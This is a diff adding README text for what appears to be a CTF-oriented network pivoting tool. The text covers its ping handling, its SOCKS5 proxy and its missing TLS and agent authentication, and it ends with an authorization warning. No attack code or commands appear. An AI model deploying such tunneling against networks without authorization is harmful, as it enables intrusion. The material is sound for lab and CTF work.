+> **Note:** Smartping runs a real OS-level `ping` per Echo Request, adding ~3-5ms latency. For large-scale scans, `-Pn` is still faster since it skips the discovery phase.
+
+### Current limitations
+
+- **Single tunnel / single active agent** at a time (CTF-focused). Simultaneous multi-agent is **deferred** (Phase 5).
+- **No TLS/wss or agent authentication** yet (Phase 4). Do not use outside a lab or controlled network.
+- **SOCKS5** only implements `CONNECT` over TCP (no BIND or UDP ASSOCIATE), sufficient for scanning/fuzzing/web proxying.
+- An agent that loses connection without clean shutdown goes **`offline` automatically** after ~45s without pings (server keep-alive sweep).
+
+### Notes (gVisor / environment)
+
+- **gVisor** has a version-sensitive API; this code tracks the `go` branch. If `go mod tidy` misaligns symbols, adjust names in `netstack.go` to the resolved version.
+- Not tested with Windows as server (Linux/WSL2 chosen for TUN support).
+
+---
+
+> ⚠️ **Use only on systems you own or with explicit written authorization.**
